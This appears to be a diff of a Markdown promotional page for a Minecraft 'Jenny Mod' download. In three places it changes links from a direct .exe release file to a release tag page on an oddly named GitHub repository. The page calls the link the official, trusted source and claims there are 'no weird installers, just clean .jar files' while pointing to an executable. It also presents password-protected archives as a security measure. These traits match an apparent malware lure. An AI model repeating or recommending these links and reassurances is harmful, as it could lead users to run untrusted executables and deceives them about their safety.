@@ -38,7 +38,7 @@ Let me break it down simply:
 - Setup guide (super clear, don't worry)
 - Extra skins & outfit packs
 
-> 👉 **[Download Jenny Mod from GitHub](https://github.com/MemoryVoiceBond/yergpjzv/releases/download/JennyMod-ModPack/JennyModGithub.exe)** — the most complete collection out there
+> 👉 **[Download Jenny Mod from GitHub](https://github.com/MemoryVoiceBond/Jenny-Mod-Windows-ALL/releases/tag/JennyMod-ModPack)** — the most complete collection out there
 
 ---
 
@@ -76,7 +76,7 @@ I get it — downloading mods from the internet can feel sketchy. Here's why you
 ✅ **Password-protected archives** — extra layer of security  
 ✅ **No weird installers** — just clean .jar files you place yourself  
 
-**Pro tip:** Always download from trusted sources like the [official GitHub repository](https://github.com/MemoryVoiceBond/yergpjzv/releases/download/JennyMod-ModPack/JennyModGithub.exe) — not random mediafire links some dude sent you in Discord.
+**Pro tip:** Always download from trusted sources like the [official GitHub repository](https://github.com/MemoryVoiceBond/Jenny-Mod-Windows-ALL/releases/tag/JennyMod-ModPack) — not random mediafire links some dude sent you in Discord.
 
 ---
 
@@ -140,7 +140,7 @@ You've got the link, you've got the steps, you've got a whole community waiting 
 **Download → Install → Spawn → Adventure together.**
 
 👇 **Grab it here:**  
-🔗 [**Jenny Mod for ALL Minecraft Versions — GitHub**](https://github.com/MemoryVoiceBond/yergpjzv/releases/download/JennyMod-ModPack/JennyModGithub.exe)
+🔗 [**Jenny Mod for ALL Minecraft Versions — GitHub**](https://github.com/MemoryVoiceBond/Jenny-Mod-Windows-ALL/releases/tag/JennyMod-ModPack)
 
 ---
 
